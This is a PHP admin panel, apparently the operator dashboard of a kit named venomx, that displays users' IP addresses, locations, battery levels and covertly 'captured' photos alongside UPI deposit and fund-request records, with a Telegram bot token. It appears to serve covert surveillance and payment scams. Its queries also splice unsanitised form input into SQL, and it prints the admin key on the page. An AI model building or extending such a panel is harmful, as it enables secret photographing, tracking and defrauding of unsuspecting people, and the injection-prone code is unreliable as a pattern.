<?php
session_start();
error_reporting(0);

// Check if admin is logged in
if(!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    header("Location: index.php");
    exit;
}

$db = new SQLite3('venomx.db');

// Get settings
$ADMIN_KEY = getSetting('admin_key');
$bg_color = getSetting('background') ?: '#0a0a0a';
$upi_id = getSetting('upi_id');
$owner_id = getSetting('owner_id');
$bot_token = getSetting('bot_token');
$min_deposit = getSetting('min_deposit') ?: 299;
$login_enabled = getSetting('login_enabled') ?: '1';

function getSetting($key) {
    global $db;
    $result = $db->querySingle("SELECT setting_value FROM settings WHERE setting_key='$key'", true);
    return $result ? $result['setting_value'] : null;
}

// Get all data
$users = $db->query("SELECT * FROM users ORDER BY id DESC");
$user_count = $db->querySingle("SELECT COUNT(*) FROM users");

$captured = $db->query("SELECT id, name, email, captured_photo, location, ip, battery_level FROM users WHERE captured_photo IS NOT NULL AND captured_photo != '' ORDER BY id DESC");
$captured_photos = [];
while($row = $captured->fetchArray()) {
    $captured_photos[] = $row;
}

$orders = $db->query("SELECT * FROM orders ORDER BY id DESC");
$order_count = $db->querySingle("SELECT COUNT(*) FROM orders");

$funds = $db->query("SELECT * FROM fund_requests ORDER BY id DESC");
$fund_count = $db->querySingle("SELECT COUNT(*) FROM fund_requests");

// Handle admin actions
if(isset($_POST['admin_action'])) {
    $action = $_POST['admin_action'];
    $admin_key = $_POST['admin_key'] ?? '';
    
    if($admin_key === $ADMIN_KEY) {
        if($action === 'change_upi') {
            $new_upi = $_POST['new_upi'];
            $db->exec("UPDATE settings SET setting_value='$new_upi' WHERE setting_key='upi_id'");
            echo "<script>alert('UPI ID updated!'); window.location.href='admin.php';</script>";
            exit;
        }
        elseif($action === 'change_admin_key') {
            $new_key = $_POST['new_admin_key'];
            $db->exec("UPDATE settings SET setting_value='$new_key' WHERE setting_key='admin_key'");
            echo "<script>alert('Admin Key updated!'); window.location.href='admin.php';</script>";
            exit;
        }
        elseif($action === 'change_bg') {
            $new_bg = $_POST['new_bg'];
            $db->exec("UPDATE settings SET setting_value='$new_bg' WHERE setting_key='background'");
            echo "<script>alert('Background updated!'); window.location.href='admin.php';</script>";
            exit;
        }
        elseif($action === 'change_owner_id') {
            $new_owner = $_POST['new_owner_id'];
            $db->exec("UPDATE settings SET setting_value='$new_owner' WHERE setting_key='owner_id'");
            echo "<script>alert('Owner ID updated!'); window.location.href='admin.php';</script>";
            exit;
        }
        elseif($action === 'change_bot_token') {
            $new_token = $_POST['new_bot_token'];
            $db->exec("UPDATE settings SET setting_value='$new_token' WHERE setting_key='bot_token'");
            echo "<script>alert('Bot Token updated!'); window.location.href='admin.php';</script>";
            exit;
        }
        elseif($action === 'change_min_deposit') {
            $new_min = $_POST['new_min_deposit'];
            $db->exec("UPDATE settings SET setting_value='$new_min' WHERE setting_key='min_deposit'");
            echo "<script>alert('Min deposit updated to ₹$new_min'); window.location.href='admin.php';</script>";
            exit;
        }
        elseif($action === 'toggle_login') {
            $new = $login_enabled == '1' ? '0' : '1';
            $db->exec("UPDATE settings SET setting_value='$new' WHERE setting_key='login_enabled'");
            echo "<script>alert('Login page toggled!'); window.location.href='admin.php';</script>";
            exit;
        }
        elseif($action === 'ban_user') {
            $user_id = intval($_POST['user_id']);
            $db->exec("UPDATE users SET banned = 1 WHERE id = $user_id");
            echo "<script>alert('User banned!'); window.location.href='admin.php';</script>";
            exit;
        }
        elseif($action === 'unban_user') {
            $user_id = intval($_POST['user_id']);
            $db->exec("UPDATE users SET banned = 0 WHERE id = $user_id");
            echo "<script>alert('User unbanned!'); window.location.href='admin.php';</script>";
            exit;
        }
        elseif($action === 'delete_user') {
            $user_id = intval($_POST['user_id']);
            $db->exec("DELETE FROM users WHERE id=$user_id");
            echo "<script>alert('User deleted!'); window.location.href='admin.php';</script>";
            exit;
        }
        elseif($action === 'ban_ip') {
            $ip = $_POST['ban_ip'];
            $db->exec("UPDATE users SET banned = 1 WHERE ip='$ip'");
            echo "<script>alert('IP banned!'); window.location.href='admin.php';</script>";
            exit;
        }
        elseif($action === 'unban_ip') {
            $ip = $_POST['unban_ip'];
            $db->exec("UPDATE users SET banned = 0 WHERE ip='$ip'");
            echo "<script>alert('IP unbanned!'); window.location.href='admin.php';</script>";
            exit;
        }
    } else {
        echo "<script>alert('Invalid Admin Key!'); window.location.href='admin.php';</script>";
        exit;
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Owner Panel</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:'Segoe UI',sans-serif; background:<?php echo $bg_color; ?>; color:#fff; min-height:100vh; }
        
        .header { background:linear-gradient(135deg,#1a0a2e,#0a0a0a); padding:20px; border-bottom:2px solid #9b59b6; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; }
        .header h1 { color:#9b59b6; font-size:24px; }
        .header a { color:#ff4444; text-decoration:none; padding:8px 20px; border:1px solid #ff4444; border-radius:8px; }
        .header a:hover { background:#ff4444; color:#fff; }
        
        .container { max-width:1400px; margin:0 auto; padding:20px; }
        
        .stats { display:grid; grid-template-columns:repeat(auto-fill,minmax(180px,1fr)); gap:15px; margin-bottom:30px; }
        .stat-card { background:rgba(0,0,0,0.6); padding:20px; border-radius:12px; border:1px solid #9b59b6; text-align:center; }
        .stat-card .num { font-size:32px; color:#9b59b6; font-weight:bold; }
        .stat-card .label { font-size:14px; color:#aaa; margin-top:5px; }
        
        .admin-panel { background:rgba(0,0,0,0.8); padding:20px; border-radius:12px; margin:20px 0; border:1px solid #9b59b6; }
        .admin-panel h4 { color:#9b59b6; margin-bottom:15px; font-size:18px; }
        .admin-panel input { padding:12px; margin:8px 0; background:rgba(255,255,255,0.05); border:1px solid #4a1a6e; border-radius:8px; color:#fff; width:100%; max-width:300px; }
        .admin-panel .admin-btn { padding:10px 25px; margin:5px; cursor:pointer; border-radius:8px; border:none; color:#fff; font-weight:bold; }
        .admin-panel .admin-btn:hover { opacity:0.8; }
        .admin-panel .danger-btn { background:#cc0000; }
        .admin-panel .success-btn { background:#00cc00; }
        .admin-panel .primary-btn { background:#9b59b6; }
        .flex-row { display:flex; gap:10px; flex-wrap:wrap; align-items:center; }
        .inline-form { display:flex; gap:10px; flex-wrap:wrap; align-items:end; }
        .inline-form div { flex:1; min-width:150px; }
        .inline-form label { color:#aaa; font-size:12px; display:block; }
        
        .user-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(300px,1fr)); gap:15px; margin-top:15px; }
        .user-card { background:rgba(26,10,46,0.6); border-radius:10px; padding:15px; border:1px solid #4a1a6e; }
        .user-card .label { color:#9b59b6; font-weight:bold; }
        .user-card .banned { color:#ff4444; }
        .user-card .active { color:#00cc00; }
        
        .photo-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(200px,1fr)); gap:15px; margin-top:15px; }
        .photo-item { background:rgba(26,10,46,0.6); border-radius:10px; padding:10px; border:1px solid #4a1a6e; text-align:center; }
        .photo-item img { width:100%; border-radius:8px; max-height:180px; object-fit:cover; }
        .photo-item p { font-size:12px; color:#aaa; margin-top:5px; }
        .photo-item .name { color:#9b59b6; font-weight:bold; }
        
        .order-item, .fund-item { background:rgba(26,10,46,0.4); padding:10px; margin:5px 0; border-radius:8px; border-left:3px solid #9b59b6; }
        
        .mt-10 { margin-top:10px; }
        
        @media (max-width:768px) { .user-grid { grid-template-columns:1fr; } .photo-grid { grid-template-columns:1fr 1fr; } }
    </style>
</head>
<body>

<div class="header">
    <h1>Owner Panel</h1>
    <div>
        <span style="color:#aaa;margin-right:15px;">Admin Key: <?php echo $ADMIN_KEY; ?></span>
        <a href="index.php?logout=1">Logout</a>
    </div>
</div>

<div class="container">

    <!-- Stats -->
    <div class="stats">
        <div class="stat-card"><div class="num"><?php echo $user_count; ?></div><div class="label">Total Users</div></div>
        <div class="stat-card"><div class="num"><?php echo $order_count; ?></div><div class="label">Total Orders</div></div>
        <div class="stat-card"><div class="num"><?php echo $fund_count; ?></div><div class="label">Fund Requests</div></div>
        <div class="stat-card"><div class="num"><?php echo count($captured_photos); ?></div><div class="label">Captured Photos</div></div>
    </div>

    <!-- Controls -->
    <div class="admin-panel">
        <h4>Admin Controls</h4>
        
        <form method="post" class="inline-form">
            <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
            <div>
                <label>Change Admin Key</label>
                <input type="text" name="new_admin_key" placeholder="New Admin Key" value="<?php echo $ADMIN_KEY; ?>">
            </div>
            <div>
                <label>&nbsp;</label>
                <button type="submit" name="admin_action" value="change_admin_key" class="admin-btn primary-btn">Update</button>
            </div>
        </form>
        
        <form method="post" class="inline-form mt-10">
            <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
            <div>
                <label>Change UPI ID</label>
                <input type="text" name="new_upi" placeholder="New UPI ID" value="<?php echo $upi_id; ?>">
            </div>
            <div>
                <label>&nbsp;</label>
                <button type="submit" name="admin_action" value="change_upi" class="admin-btn primary-btn">Update</button>
            </div>
        </form>
        
        <form method="post" class="inline-form mt-10">
            <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
            <div>
                <label>Change Owner ID (Telegram)</label>
                <input type="text" name="new_owner_id" placeholder="New Owner ID" value="<?php echo $owner_id; ?>">
            </div>
            <div>
                <label>&nbsp;</label>
                <button type="submit" name="admin_action" value="change_owner_id" class="admin-btn primary-btn">Update</button>
            </div>
        </form>
        
        <form method="post" class="inline-form mt-10">
            <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
            <div>
                <label>Change Bot Token</label>
                <input type="text" name="new_bot_token" placeholder="New Bot Token" value="<?php echo $bot_token; ?>">
            </div>
            <div>
                <label>&nbsp;</label>
                <button type="submit" name="admin_action" value="change_bot_token" class="admin-btn primary-btn">Update</button>
            </div>
        </form>
        
        <form method="post" class="inline-form mt-10">
            <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
            <div>
                <label>Minimum Deposit</label>
                <input type="number" name="new_min_deposit" placeholder="Min Deposit" value="<?php echo $min_deposit; ?>">
            </div>
            <div>
                <label>&nbsp;</label>
                <button type="submit" name="admin_action" value="change_min_deposit" class="admin-btn primary-btn">Update</button>
            </div>
        </form>
        
        <form method="post" class="inline-form mt-10">
            <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
            <div>
                <label>Background Color</label>
                <input type="color" name="new_bg" value="<?php echo $bg_color; ?>" style="height:45px; width:60px; padding:2px; background:transparent; border:none; cursor:pointer;">
            </div>
            <div>
                <label>&nbsp;</label>
                <button type="submit" name="admin_action" value="change_bg" class="admin-btn primary-btn">Apply</button>
            </div>
        </form>
        
        <form method="post" class="inline-form mt-10">
            <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
            <div>
                <label>Login Page</label>
                <button type="submit" name="admin_action" value="toggle_login" class="admin-btn <?php echo $login_enabled == '1' ? 'danger-btn' : 'success-btn'; ?>">
                    <?php echo $login_enabled == '1' ? 'Disable Login' : 'Enable Login'; ?>
                </button>
            </div>
        </form>
        
        <form method="post" class="inline-form mt-10">
            <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
            <div>
                <label>Ban IP</label>
                <input type="text" name="ban_ip" placeholder="IP to Ban">
            </div>
            <div>
                <label>&nbsp;</label>
                <button type="submit" name="admin_action" value="ban_ip" class="admin-btn danger-btn">Ban</button>
            </div>
            <div>
                <label>Unban IP</label>
                <input type="text" name="unban_ip" placeholder="IP to Unban">
            </div>
            <div>
                <label>&nbsp;</label>
                <button type="submit" name="admin_action" value="unban_ip" class="admin-btn success-btn">Unban</button>
            </div>
        </form>
    </div>

    <!-- Users List -->
    <div class="admin-panel">
        <h4>Users (<?php echo $user_count; ?>)</h4>
        <div class="user-grid">
        <?php while($u = $users->fetchArray()): ?>
            <div class="user-card">
                <p><span class="label">ID:</span> <?php echo $u['id']; ?></p>
                <p><span class="label">Name:</span> <?php echo $u['name'] ?? 'N/A'; ?></p>
                <p><span class="label">Email:</span> <?php echo $u['email']; ?></p>
                <p><span class="label">Wallet:</span> ₹<?php echo number_format($u['wallet'], 2); ?></p>
                <p><span class="label">IP:</span> <?php echo $u['ip'] ?? 'Unknown'; ?></p>
                <p><span class="label">Location:</span> <?php echo $u['location'] ?? 'Unknown'; ?></p>
                <p><span class="label">Battery:</span> <?php echo $u['battery_level'] ?? 'Unknown'; ?></p>
                <p><span class="label">Status:</span> <?php echo $u['banned'] == 1 ? '<span class="banned">Banned</span>' : '<span class="active">Active</span>'; ?></p>
                <div style="display:flex; gap:5px; flex-wrap:wrap; margin-top:10px;">
                    <?php if($u['banned'] == 1): ?>
                    <form method="post" style="display:inline;">
                        <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
                        <input type="hidden" name="user_id" value="<?php echo $u['id']; ?>">
                        <button type="submit" name="admin_action" value="unban_user" class="admin-btn success-btn" style="padding:5px 15px; font-size:12px;">Unban</button>
                    </form>
                    <?php else: ?>
                    <form method="post" style="display:inline;">
                        <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
                        <input type="hidden" name="user_id" value="<?php echo $u['id']; ?>">
                        <button type="submit" name="admin_action" value="ban_user" class="admin-btn danger-btn" style="padding:5px 15px; font-size:12px;">Ban</button>
                    </form>
                    <?php endif; ?>
                    <form method="post" style="display:inline;">
                        <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
                        <input type="hidden" name="user_id" value="<?php echo $u['id']; ?>">
                        <button type="submit" name="admin_action" value="delete_user" class="admin-btn danger-btn" style="padding:5px 15px; font-size:12px; background:#ff4444;" onclick="return confirm('Delete this user?')">Delete</button>
                    </form>
                </div>
            </div>
        <?php endwhile; ?>
        </div>
    </div>

    <!-- Captured Photos -->
    <div class="admin-panel">
        <h4>Captured Photos (<?php echo count($captured_photos); ?>)</h4>
        <div class="photo-grid">
        <?php foreach($captured_photos as $photo): ?>
            <div class="photo-item">
                <img src="<?php echo $photo['captured_photo']; ?>" alt="Captured">
                <p class="name"><?php echo $photo['name'] ?? 'Unknown'; ?></p>
                <p>IP: <?php echo $photo['ip'] ?? 'Unknown'; ?></p>
                <p>Location: <?php echo $photo['location'] ?? 'Unknown'; ?></p>
                <p>Battery: <?php echo $photo['battery_level'] ?? 'Unknown'; ?></p>
            </div>
        <?php endforeach; ?>
        <?php if(count($captured_photos) == 0): ?>
            <p style="color:#888;">No captured photos yet</p>
        <?php endif; ?>
        </div>
    </div>

    <!-- Orders -->
    <div class="admin-panel">
        <h4>Orders (<?php echo $order_count; ?>)</h4>
        <?php while($o = $orders->fetchArray()): ?>
        <div class="order-item">
            <strong><?php echo $o['name']; ?></strong> - ₹<?php echo number_format($o['amount'], 2); ?>
            <span style="color:#888;font-size:12px;margin-left:10px;"><?php echo $o['created_at']; ?></span>
            <span style="color:#00cc00;font-size:12px;margin-left:10px;"><?php echo $o['status']; ?></span>
        </div>
        <?php endwhile; ?>
        <?php if($order_count == 0): ?>
        <p style="color:#888;">No orders yet</p>
        <?php endif; ?>
    </div>

    <!-- Fund Requests -->
    <div class="admin-panel">
        <h4>Fund Requests (<?php echo $fund_count; ?>)</h4>
        <?php while($f = $funds->fetchArray()): ?>
        <div class="fund-item">
            <strong>₹<?php echo number_format($f['amount'], 2); ?></strong> - UTR: <?php echo $f['utr']; ?>
            <span style="color:#888;font-size:12px;margin-left:10px;"><?php echo $f['created_at']; ?></span>
            <span style="color:<?php echo $f['status'] == 'pending' ? '#ffd700' : '#00cc00'; ?>;font-size:12px;margin-left:10px;"><?php echo $f['status']; ?></span>
        </div>
        <?php endwhile; ?>
        <?php if($fund_count == 0): ?>
        <p style="color:#888;">No fund requests</p>
        <?php endif; ?>
    </div>

</div>

</body>
</html>